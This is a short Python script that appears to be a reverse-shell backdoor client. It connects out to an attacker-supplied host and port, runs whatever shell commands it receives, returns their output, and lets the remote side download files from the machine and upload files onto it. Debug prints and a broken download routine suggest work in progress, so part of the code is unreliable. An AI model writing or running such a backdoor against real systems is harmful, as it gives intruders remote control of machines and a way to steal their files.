#!/usr/bin/python

import os
import sys
import json
import base64
import socket
import subprocess
from time import sleep
from termcolor import colored


def s_send(data):
    print(2)
    json_data = json.dumps(data)
    print(3)
    sock.send(json_data.encode("utf-8"))
    print(4)

def s_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode("utf-8")
            return json.loads(data)
        except ValueError:
            continue
        except ConnectionResetError:
            sys.exit()

def shell():
    while True:
        command = s_recv()
        print(command)
        if command == "q":
            break
        elif command[:2] =="cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            print(command[:8])
            print(command[9:])
            try:
                with open(command[9:], "r") as fout:
                    print(type(fout.read()))
                    print(1)
                    print(fout.read())
                    s_send(base64.b64encode(fout.read()))
                    print(5)
            except:
                print(colored("Download Failed !!!", "red"))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                file_data = s_recv()
                print(type(file_data))
                print(file_data)
                fin.write(base64.b64decode(file_data))
        else:
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            result = proc.stdout.read() + proc.stderr.read()
            s_send(result.decode("utf-8"))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))


shell()
sock.close()
print(colored("Closing connection !!!", "red"))